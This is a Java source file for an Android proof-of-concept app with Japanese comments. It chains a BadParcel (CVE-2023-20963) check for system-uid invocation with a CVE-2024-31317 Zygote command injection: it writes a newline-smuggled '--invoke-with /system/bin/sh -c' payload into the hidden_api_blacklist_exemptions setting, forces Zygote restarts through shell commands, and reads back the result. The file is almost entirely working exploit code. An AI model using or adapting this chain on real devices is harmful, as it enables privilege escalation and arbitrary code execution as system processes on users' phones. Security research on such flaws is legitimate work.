package com.example.tzpoc;

import android.app.Activity;
import android.os.Binder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Process;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class ProofActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int callerUid = Binder.getCallingUid();
        int myUid = Process.myUid();

        String msg = "[ProofActivity] called. callerUid=" + callerUid + ", myUid=" + myUid;
        Log.i("BadParcel", msg);
        MainActivity.appendLog(msg);

        // ---- 証跡ファイル作成 ----
        createProofFile(callerUid, myUid);

        if (callerUid == 1000) {
            MainActivity.appendLog("[!!!] BadParcel SUCCESS: Called by system (uid=1000)");

            // ---- ステージ2: CVE-2024-31317 Zygote Injection ----
            MainActivity.appendLog("[*] Stage 2: Executing CVE-2024-31317 Zygote Injection...");
            executeZygoteInjection();

            // ---- ステージ3: Zygote 再起動トリガー ----
            MainActivity.appendLog("[*] Stage 3: Triggering Zygote reload...");
            triggerZygoteReload();

        } else {
            MainActivity.appendLog("[!] Called by non-system uid: " + callerUid);
            MainActivity.appendLog("[!] CVE-2024-31317 injection will NOT be attempted.");
        }

        finish();
    }

    private void createProofFile(int callerUid, int myUid) {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists()) dir.mkdirs();
            File proof = new File(dir, "two_stage_proof.txt");
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                pw.println("=== Two-Stage Exploit Proof ===");
                pw.println("Timestamp: " + new java.util.Date());
                pw.println("Caller UID: " + callerUid);
                pw.println("My UID: " + myUid);
                pw.println("BadParcel (CVE-2023-20963): " + (callerUid == 1000 ? "SUCCESS" : "FAILED"));
                pw.println("CVE-2024-31317: Attempted if BadParcel succeeded");
            }
            MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to create proof: " + e.getMessage());
        }
    }

    /**
     * CVE-2024-31317: Zygote コマンドインジェクション
     * hidden_api_blacklist_exemptions に改行を含むペイロードを注入
     */
    private void executeZygoteInjection() {
        MainActivity.appendLog("[*] CVE-2024-31317: Injecting Zygote arguments...");

        try {
            // 1. 現在の値を取得
            String current = Settings.Global.getString(getContentResolver(),
                    "hidden_api_blacklist_exemptions");
            MainActivity.appendLog("[+] Current hidden_api_blacklist_exemptions: " + current);

            // 2. ペイロード構築
            //    --invoke-with で id コマンドを実行し、結果をファイルに出力
            String payload = "L*\n" +
                    "--invoke-with /system/bin/sh -c 'id > /data/local/tmp/zygote_id_output.txt'";

            MainActivity.appendLog("[+] Payload: " + payload.replace("\n", "\\n"));

            // 3. 注入実行
            boolean result = Settings.Global.putString(getContentResolver(),
                    "hidden_api_blacklist_exemptions", payload);
            MainActivity.appendLog("[+] Settings.Global.putString result: " + result);

            // 4. 注入確認
            String verify = Settings.Global.getString(getContentResolver(),
                    "hidden_api_blacklist_exemptions");
            MainActivity.appendLog("[+] Verified hidden_api_blacklist_exemptions: " +
                    (verify != null ? verify.replace("\n", "\\n") : "null"));

        } catch (Exception e) {
            MainActivity.appendLog("[-] CVE-2024-31317 injection failed: " + e.getMessage());
        }
    }

    /**
     * Zygote 再起動をトリガー
     * システム再起動を模倣するか、特定アプリを強制再起動
     */
    private void triggerZygoteReload() {
        MainActivity.appendLog("[*] Triggering Zygote reload...");

        // 方法1: stop/start (システム権限が必要だが、プロセスはアプリ権限のままなので失敗する可能性大)
        try {
            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c", "stop && start"
            });
            int exitCode = process.waitFor();
            MainActivity.appendLog("[+] stop/start exit code: " + exitCode);
        } catch (Exception e) {
            MainActivity.appendLog("[-] stop/start failed: " + e.getMessage());
        }

        // 方法2: Settings アプリの再起動 (Zygote が新しいプロセスを孵化する)
        try {
            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c", "am force-stop com.android.settings && am start -n com.android.settings/.Settings"
            });
            int exitCode = process.waitFor();
            MainActivity.appendLog("[+] Settings restart exit code: " + exitCode);
        } catch (Exception e) {
            MainActivity.appendLog("[-] Settings restart failed: " + e.getMessage());
        }

        // 方法3: 自前のアプリを再起動して Zygote を呼び出す
        try {
            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c", "am force-stop com.example.tzpoc && am start -n com.example.tzpoc/.MainActivity"
            });
            int exitCode = process.waitFor();
            MainActivity.appendLog("[+] Self restart exit code: " + exitCode);
        } catch (Exception e) {
            MainActivity.appendLog("[-] Self restart failed: " + e.getMessage());
        }

        // 4. 実行結果の確認
        MainActivity.appendLog("[*] Checking for zygote_id_output.txt...");
        try {
            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c", "cat /data/local/tmp/zygote_id_output.txt 2>/dev/null || echo 'File not found'"
            });
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            String content = output.toString().trim();
            MainActivity.appendLog("[+] zygote_id_output.txt content:\n" + content);
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to read zygote output: " + e.getMessage());
        }
    }
}
